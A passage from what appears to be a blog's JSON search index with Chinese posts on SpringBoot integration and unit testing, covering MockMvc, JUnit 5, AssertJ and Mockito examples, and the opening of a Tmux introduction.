集成测试\u003c/h2\u003e\n\u003cp\u003e只编写单测，无法测试方法之间的集成情况，而且某些需求可能会修改多个方法，这可能会影响方法对应的单测，涉及到大量的相关单测的修改，这样的维护成本很高\u003c/p\u003e\n\u003cp\u003e可以把重心放在完善集成测试上，专注从外部判断程序是否符合预期。对于一些非常重要的方法，增加单元测试可以减轻集成测试排查错误的难度\u003c/p\u003e\n\u003cp\u003e先导知识可以参考上一节：\u003ca href=\"https://www.cnblogs.com/aaronlinv/p/17645009.html\"\u003eSpringBoot 测试实践 - 1：常用的工具\u003c/a\u003e\u003c/p\u003e\n\u003ch2 id=\"springboottest-和-mockmvc-进行集成测试\"\u003eSpringBootTest 和 MockMvc 进行集成测试\u003c/h2\u003e\n\u003cp\u003e从 \u003ca href=\"https://github.com/spring-projects/spring-boot/wiki/Spring-Boot-2.1-Release-Notes#junit-5\"\u003eSpring Boot 2.1\u003c/a\u003e 开始 \u003ccode\u003e@ExtendWith({SpringExtension.class})\u003c/code\u003e 作为元注解包含在 Spring Boot 测试注解中，例如 @DataJpaTest、@WebMvcTest 和 @SpringBootTest，所以我们不用重复添加 \u003ccode\u003e@ExtendWith({SpringExtension.class})\u003c/code\u003e 注解\u003c/p\u003e\n\u003ch3 id=\"helloworld-测试\"\u003eHelloWorld 测试\u003c/h3\u003e\n\u003cp\u003e使用 SpringBoot 一个简单的 HelloWorld 案例，通过 \u003ccode\u003e@SpringBootTest\u003c/code\u003e 可以在测试环境中加载整个 Spring 应用程序上下文，\u003ccode\u003e@SpringBootTest\u003c/code\u003e 注解会扫描应用程序的主配置类，并加载所有的 Bean（包括依赖的 Bean）到测试上下文中。这样，测试中就可以使用完整的 Spring 功能，包括依赖注入、AOP、事务管理等\u003c/p\u003e\n\u003cp\u003e使用 \u003ccode\u003e@AutoConfigureMockMvc\u003c/code\u003e 自动配置 \u003ccode\u003eMockMvc\u003c/code\u003e，通过 \u003ccode\u003eMockMvc\u003c/code\u003e 可以模拟 HTTP 请求，并对响应的结果进行断言和验证\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-java\" data-lang=\"java\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"kn\"\u003eimport\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"nn\"\u003eorg.junit.jupiter.api.Test\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"kn\"\u003eimport\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"nn\"\u003eorg.springframework.beans.factory.annotation.Autowired\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"kn\"\u003eimport\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"nn\"\u003eorg.springframework.boot.test.autoconfigure.web.servlet.AutoConfigureMockMvc\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"kn\"\u003eimport\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"nn\"\u003eorg.springframework.boot.test.context.SpringBootTest\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"kn\"\u003eimport\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"nn\"\u003eorg.springframework.http.MediaType\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"kn\"\u003eimport\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"nn\"\u003eorg.springframework.test.web.servlet.MockMvc\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"kn\"\u003eimport\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"nn\"\u003eorg.springframework.test.web.servlet.request.MockMvcRequestBuilders\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"kn\"\u003eimport\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"nn\"\u003eorg.springframework.test.web.servlet.result.MockMvcResultMatchers\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"nd\"\u003e@AutoConfigureMockMvc\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"nd\"\u003e@SpringBootTest\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ewebEnvironment\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003eSpringBootTest\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eWebEnvironment\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eRANDOM_PORT\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"kd\"\u003epublic\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"kd\"\u003eclass\u003c/span\u003e \u003cspan class=\"nc\"\u003eMySpringBootTest\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e\u003cspan class=\"nd\"\u003e@Autowired\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e\u003cspan class=\"kd\"\u003eprivate\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003eMockMvc\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003emockMvc\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"c1\"\u003e// 注入 MockMvc\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e\u003cspan class=\"nd\"\u003e@Test\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e\u003cspan class=\"kd\"\u003epublic\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"kt\"\u003evoid\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"nf\"\u003etestHelloWorld\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"kd\"\u003ethrows\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003eException\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e        \u003c/span\u003e\u003cspan class=\"c1\"\u003e// 发送 GET 请求\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e        \u003c/span\u003e\u003cspan class=\"n\"\u003emockMvc\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eperform\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eMockMvcRequestBuilders\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eget\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;/hello\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e                \u003c/span\u003e\u003cspan class=\"c1\"\u003e// 设置请求头\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e                \u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eaccept\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eMediaType\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eAPPLICATION_JSON\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e                \u003c/span\u003e\u003cspan class=\"c1\"\u003e// 验证响应状态码\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e                \u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eandExpect\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eMockMvcResultMatchers\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003estatus\u003c/span\u003e\u003cspan class=\"p\"\u003e().\u003c/span\u003e\u003cspan class=\"na\"\u003eisOk\u003c/span\u003e\u003cspan class=\"p\"\u003e())\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e                \u003c/span\u003e\u003cspan class=\"c1\"\u003e// 验证响应内容\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e                \u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eandExpect\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eMockMvcResultMatchers\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003econtent\u003c/span\u003e\u003cspan class=\"p\"\u003e().\u003c/span\u003e\u003cspan class=\"na\"\u003estring\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;Hello, World!\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e));\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"涉及数据层的测试h2\"\u003e涉及数据层的测试：H2\u003c/h3\u003e\n\u003cp\u003e部分操作涉及到数据库，一般都会引入数据层的依赖，在对应的 HTTP 请求后，对响应体和数据库数据进行断言和验证，就像下面这样：\u003c/p\u003e","title":"SpringBoot 测试实践 - 2：单元测试与集成测试"},{"content":"下一节：SpringBoot 测试实践 - 2：单元测试与集成测试\n我自己接触到的一些商业或是开源的基于 SpringBoot 项目，它们大部分是没有测试代码的，test 文件夹只有脚手架初始化生成的那个测试类，跟不同的开发聊到这个话题，发现他们中的大部分没有写测试的习惯，或者是觉得写测试代码麻烦，主要还是依赖测试工程师做黑盒的测试。只做黑盒测试的话有一定的的局限性，一些边界的条件可能就覆盖不到，而且相对来说人也比较容易出错、遗漏。而测试代码能解决其中很大一部分的问题，利用好单元测试和集成测试在某些情况下相对于直接通过 UI 进行测试是要更方便、节省时间的，所以想通过几篇博客来分享一下自己的测试实践\n为什么要写测试（优点） 覆盖更多的边界条件，且随时都可以运行测试代码（一劳永逸） 缩小测试范围：测试某个方法只需要运行对应的测试代码，而不需要运行整个项目通过请求接口进行测试 对重构更友好，可以随时重构有集成测试的代码，不用担心打破原有的代码 其他人也可以通过测试快速地理清楚对应被测代码的主线逻辑（类似文档的作用，特别是复杂代码，通过测试能快速理解上手） 写测试的过程，给自己一个新的视角去审视代码结构的设计，有助于改善代码设计 当然代码方式的测试也并非完美无缺：测试代码增加编写和维护的成本，同时一些外部依赖也需要通过 Mock 的方式实现，这些都提高了整个测试编写的门槛。也倒逼我们思考更好地组织代码，减少依赖\n另一个方面：测试对于重构也是至关重要的，随着对业务的理解越来越深刻，可以重构代码，抽象出了一些共性的逻辑，优化代码结构，但是如果没有相关测试，面对着旧代码就只能望而却步了\n测试工具：JUnit 5, AssertJ，Mockito spring-boot-starter-test 自带常用的测试工具：JUnit5、Assertj、Mockito，可以直接使用\nJUnit5 Junit 5 包含：\nJUnit Platform：Test Engine Jupiter：编程模型和拓展模型 Vintage：兼容老版本 JUnit 4 和 5 使用的包有所不同\n// JUnit 4 import org.junit.Test; import static org.junit.Assert.assertEquals; // JUnit 5 import org.junit.jupiter.api.Test; import static org.junit.jupiter.api.Assertions.assertEquals; 如果不考虑兼容 JUnit 4 的测试，我们可以直接在依赖中直接排除 JUnit 4 的依赖，这样也可以避免在使用的时候错误地引入 JUnit 4 的包\n\u0026lt;dependencies\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-test\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;{spring-boot-starter-test-version}\u0026lt;/version\u0026gt; \u0026lt;scope\u0026gt;test\u0026lt;/scope\u0026gt; \u0026lt;exclusions\u0026gt; \u0026lt;exclusion\u0026gt; \u0026lt;groupId\u0026gt;junit\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;junit\u0026lt;/artifactId\u0026gt; \u0026lt;/exclusion\u0026gt; \u0026lt;exclusion\u0026gt; \u0026lt;groupId\u0026gt;org.junit.vintage\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;junit-vintage-engine\u0026lt;/artifactId\u0026gt; \u0026lt;/exclusion\u0026gt; \u0026lt;/exclusions\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;/dependencies\u0026gt; 还有一点值得注意的是：JUnit 5 中 @RunWith 被 @ExtendWith 代替\nAssertJ AssertJ 是一种支持链式编程的断言库，相对于 JUnit 自带的断言，它提供了更多的方法，也提供了更好的断言不匹配时的信息展示\nimport org.junit.jupiter.api.Test; import static org.assertj.core.api.Assertions.assertThat; public class MyTest { // 变量断言 @Test public void test() { String name = \u0026#34;Alice\u0026#34;; int age = 30; assertThat(name).isEqualTo(\u0026#34;Alice\u0026#34;); assertThat(age).isGreaterThan(18).isLessThan(60); } // List 断言 @Test public void testList() { List\u0026lt;String\u0026gt; list = Arrays.asList(\u0026#34;foo\u0026#34;, \u0026#34;bar\u0026#34;, \u0026#34;baz\u0026#34;) assertThat(list).containsExactly(\u0026#34;foo\u0026#34;, \u0026#34;bar\u0026#34;, \u0026#34;baz\u0026#34;).hasSize(3); } // Map 断言 @Test public void testMap() { Map\u0026lt;String, Integer\u0026gt; map = new HashMap\u0026lt;\u0026gt;(); map.put(\u0026#34;apple\u0026#34;, 1); map.put(\u0026#34;banana\u0026#34;, 2); map.put(\u0026#34;orange\u0026#34;, 3); assertThat(map).containsEntry(\u0026#34;banana\u0026#34;, 2); assertThat(map).containsKey(\u0026#34;banana\u0026#34;); assertThat(map).containsValue(2); } // hasNoNullFieldsOrProperties 来断言测试对象的每个属性都不为 null @Test public void testHasNoNullFieldsOrProperties() { Person person = new Person(\u0026#34;Alice\u0026#34;, 30); assertThat(person).hasNoNullFieldsOrProperties(); } // 异常断言 @Test public void testDivideByZeroThrowsException() { assertThatThrownBy(() -\u0026gt; { int result = 1 / 0; }).isInstanceOf(ArithmeticException.class) .hasMessageContaining(\u0026#34;/ by zero\u0026#34;); } } Mockito Mockito 是一个 Java Mock 框架，用于创建各种类型的 Mock 对象，并设置 Mock 对象的行为\nimport static org.mockito.Mockito.*; import org.junit.jupiter.api.Test; public class MyTest { // 创建 mock 对象 @Test public void testCreateMock() { List\u0026lt;String\u0026gt; list = mock(List.class); } // 设置 mock 对象的行为 @Test public void testMockBehavior() { List\u0026lt;String\u0026gt; list = mock(List.class); when(list.get(0)).thenReturn(\u0026#34;foo\u0026#34;); when(list.size()).thenReturn(1); } // 验证 mock 对象的方法调用 @Test public void testMockVerification() { List\u0026lt;String\u0026gt; list = mock(List.class); list.add(\u0026#34;foo\u0026#34;); list.add(\u0026#34;bar\u0026#34;); verify(list).add(\u0026#34;foo\u0026#34;); verify(list).add(\u0026#34;bar\u0026#34;); // 验证调用方法的次数 verify(list, times(2)).add(anyString()); } // 模拟方法抛出异常 @Test public void testMockException() { List\u0026lt;String\u0026gt; list = mock(List.class); doThrow(new RuntimeException()).when(list).clear(); assertThrows(RuntimeException.class, () -\u0026gt; list.clear()); } } 也可以用注解来声明 Mock 对象，这样更清晰\nimport static org.mockito.Mockito.*; import java.util.List; import org.junit.jupiter.api.Test; import org.junit.jupiter.api.extension.ExtendWith; import org.mockito.InjectMocks; import org.mockito.Mock; import org.mockito.junit.jupiter.MockitoExtension; // 启用 Mockito 扩展 @ExtendWith(MockitoExtension.class) public class MyMockitoTest { // 创建一个 List 类型的 Mock 对象 @Mock List\u0026lt;String\u0026gt; mockList; // 使用 @InjectMocks，将会自动注入被测试类中所声明的 Mock 对象到这个对象中 @InjectMocks MyService myService; @Test public void testMock() { // 模拟 Mock 对象的行为 when(mockList.get(0)).thenReturn(\u0026#34;foo\u0026#34;); when(mockList.size()).thenReturn(1); String result = myService.doSomething(); assertEquals(\u0026#34;foo\u0026#34;, result); verify(mockList).get(0); } } class MyService { private List\u0026lt;String\u0026gt; list; public MyService(List\u0026lt;String\u0026gt; list) { this.list = list; } public String doSomething() { return list.get(0); } } 下一节：SpringBoot 测试实践 - 2：单元测试与集成测试\n参考资料 《重构 改善既有代码的设计》 有哪个开源项目，单元测试用例覆盖的比较全的？ 业务代码写单元测试的最佳姿势是什么？ 单元测试有落地效果好的团队吗？ Modern Best Practices for Testing in Java Thoughts on efficient enterprise testing (1/6) - Sebastian Daschner\n","permalink":"https://aaronlinv.github.io/posts/springboot-%E6%B5%8B%E8%AF%95%E5%AE%9E%E8%B7%B5---1%E5%B8%B8%E7%94%A8%E7%9A%84%E5%B7%A5%E5%85%B7/","summary":"\u003cp\u003e下一节：\u003ca href=\"https://www.cnblogs.com/aaronlinv/p/17645803.html\"\u003eSpringBoot 测试实践 - 2：单元测试与集成测试\u003c/a\u003e\u003c/p\u003e\n\u003c!-- raw HTML omitted --\u003e\n\u003chr\u003e\n\u003cp\u003e我自己接触到的一些商业或是开源的基于 SpringBoot 项目，它们大部分是没有测试代码的，\u003ccode\u003etest\u003c/code\u003e 文件夹只有脚手架初始化生成的那个测试类，跟不同的开发聊到这个话题，发现他们中的大部分没有写测试的习惯，或者是觉得写测试代码麻烦，主要还是依赖测试工程师做黑盒的测试。只做黑盒测试的话有一定的的局限性，一些边界的条件可能就覆盖不到，而且相对来说人也比较容易出错、遗漏。而测试代码能解决其中很大一部分的问题，利用好单元测试和集成测试在某些情况下相对于直接通过 UI 进行测试是要更方便、节省时间的，所以想通过几篇博客来分享一下自己的测试实践\u003c/p\u003e\n\u003ch2 id=\"为什么要写测试优点\"\u003e为什么要写测试（优点）\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e覆盖更多的边界条件，且随时都可以运行测试代码（一劳永逸）\u003c/li\u003e\n\u003cli\u003e缩小测试范围：测试某个方法只需要运行对应的测试代码，而不需要运行整个项目通过请求接口进行测试\u003c/li\u003e\n\u003cli\u003e对重构更友好，可以随时重构有集成测试的代码，不用担心打破原有的代码\u003c/li\u003e\n\u003cli\u003e其他人也可以通过测试快速地理清楚对应被测代码的主线逻辑（类似文档的作用，特别是复杂代码，通过测试能快速理解上手）\u003c/li\u003e\n\u003cli\u003e写测试的过程，给自己一个新的视角去审视代码结构的设计，有助于改善代码设计\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e当然代码方式的测试也并非完美无缺：测试代码增加编写和维护的成本，同时一些外部依赖也需要通过 Mock 的方式实现，这些都提高了整个测试编写的门槛。也倒逼我们思考更好地组织代码，减少依赖\u003c/p\u003e\n\u003cp\u003e另一个方面：测试对于重构也是至关重要的，随着对业务的理解越来越深刻，可以重构代码，抽象出了一些共性的逻辑，优化代码结构，但是如果没有相关测试，面对着旧代码就只能望而却步了\u003c/p\u003e\n\u003ch2 id=\"测试工具junit-5-assertjmockito\"\u003e测试工具：JUnit 5, AssertJ，Mockito\u003c/h2\u003e\n\u003cp\u003e\u003ccode\u003espring-boot-starter-test\u003c/code\u003e 自带常用的测试工具：\u003ccode\u003eJUnit5\u003c/code\u003e、\u003ccode\u003eAssertj\u003c/code\u003e、\u003ccode\u003eMockito\u003c/code\u003e，可以直接使用\u003c/p\u003e\n\u003ch3 id=\"junit5\"\u003eJUnit5\u003c/h3\u003e\n\u003cp\u003eJunit 5 包含：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eJUnit Platform：Test Engine\u003c/li\u003e\n\u003cli\u003eJupiter：编程模型和拓展模型\u003c/li\u003e\n\u003cli\u003eVintage：兼容老版本\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eJUnit 4 和 5 使用的包有所不同\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-java\" data-lang=\"java\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e// JUnit 4\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"kn\"\u003eimport\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"nn\"\u003eorg.junit.Test\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"kn\"\u003eimport static\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"nn\"\u003eorg.junit.Assert.assertEquals\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"c1\"\u003e// JUnit 5\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"kn\"\u003eimport\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"nn\"\u003eorg.junit.jupiter.api.Test\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"kn\"\u003eimport static\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"nn\"\u003eorg.junit.jupiter.api.Assertions.assertEquals\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e如果不考虑兼容 JUnit 4 的测试，我们可以直接在依赖中直接排除 JUnit 4 的依赖，这样也可以避免在使用的时候错误地引入 JUnit 4 的包\u003c/p\u003e","title":"SpringBoot 测试实践 - 1：常用的工具"},{"content":"Tmux 是一个 Linux （Mac OS也支持）下的终端复用器，相较于 Screen 更为强大，但快捷键和操作逻辑也更复杂，一段时间不用，就很容易忘记相关的命令和快捷键。本文旨在通过一个简单的场景，快速重拾 Tmux\nTmux 通常用来保持会话（session），如果我们通过 ssh 连接服务器处理打包等的耗时操作，那么网络波动可能会导致连接断开，使得操作失败，使用 Tmux 会话会被保持，任务依然会继续，我们可以随时恢复会话\nTmux 另一个常用的功能是分屏，快速地创建 Window 和 Pane，方便地在不同的任务间穿梭\n修改配置 vim 